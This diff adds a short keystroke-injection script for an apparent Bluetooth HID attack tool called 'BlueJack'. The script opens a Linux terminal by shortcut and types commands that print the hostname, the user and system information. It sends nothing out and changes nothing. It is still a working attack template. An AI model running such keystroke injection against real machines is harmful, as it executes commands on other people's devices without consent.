@@ -1,0 +1,24 @@
+REM Linux Payload - Opens Terminal and runs commands
+DELAY 2000
+CTRL ALT t
+DELAY 1000
+STRING echo "BlueJack Bluetooth HID Attack"
+ENTER
+DELAY 500
+STRING echo "Connected to: $(hostname)"
+ENTER
+DELAY 500
+STRING echo "User: $(whoami)"
+ENTER
+DELAY 500
+STRING echo "System Info:"
+ENTER
+DELAY 500
+STRING uname -a
+ENTER
+DELAY 1000
+STRING echo "Attack completed successfully!"
+ENTER
+DELAY 1000
+STRING exit
+ENTER
